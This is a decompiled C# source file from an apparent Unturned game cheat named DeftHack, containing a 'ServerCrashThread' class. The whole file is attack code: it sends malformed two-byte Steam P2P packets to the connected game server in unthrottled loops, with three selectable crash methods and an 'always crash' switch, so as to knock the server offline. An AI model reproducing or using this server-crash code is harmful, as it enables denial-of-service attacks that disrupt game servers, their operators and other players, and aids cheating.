using System;
using System.Threading;
using DeftHack.Attributes;
using DeftHack.Options;
using DeftHack.Overrides;
using SDG.Unturned;
using Steamworks;

namespace DeftHack.Threads
{
	// Token: 0x02000038 RID: 56
	public static class ServerCrashThread
	{
		// Token: 0x060000D0 RID: 208 RVA: 0x00008CC0 File Offset: 0x00006EC0
		[Thread]
		public static void Start()
		{
			Provider.onClientDisconnected = (Provider.ClientDisconnected)Delegate.Combine(Provider.onClientDisconnected, new Provider.ClientDisconnected(delegate()
			{
				ServerCrashThread.ServerCrashEnabled = false;
				OV_Provider.IsConnected = false;
			}));
			byte[] array = new byte[2];
			array[0] = 20;
			byte[] pubData = array;
			byte[] array2 = new byte[2];
			array2[0] = 21;
			byte[] pubData2 = array2;
			byte[] array3 = new byte[2];
			array3[0] = 24;
			byte[] pubData3 = array3;
			for (;;)
			{
				bool flag = OV_Provider.IsConnected && (ServerCrashThread.ServerCrashEnabled || ServerCrashThread.AlwaysCrash);
				bool flag2 = flag;
				if (flag2)
				{
					switch (MiscOptions.SCrashMethod)
					{
					case 1:
						while (OV_Provider.IsConnected && (ServerCrashThread.ServerCrashEnabled || ServerCrashThread.AlwaysCrash))
						{
							SteamNetworking.SendP2PPacket(Provider.server, pubData, 2u, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
						}
						break;
					case 2:
						while (OV_Provider.IsConnected && (ServerCrashThread.ServerCrashEnabled || ServerCrashThread.AlwaysCrash))
						{
							SteamNetworking.SendP2PPacket(Provider.server, pubData2, 2u, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
						}
						break;
					case 3:
						while (OV_Provider.IsConnected && (ServerCrashThread.ServerCrashEnabled || ServerCrashThread.AlwaysCrash))
						{
							SteamNetworking.SendP2PPacket(Provider.server, pubData3, 2u, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
						}
						break;
					}
				}
				else
				{
					Thread.Sleep(1000);
				}
			}
		}

		// Token: 0x0400007E RID: 126
		public static bool ServerCrashEnabled;

		// Token: 0x0400007F RID: 127
		public static bool AlwaysCrash;
	}
}
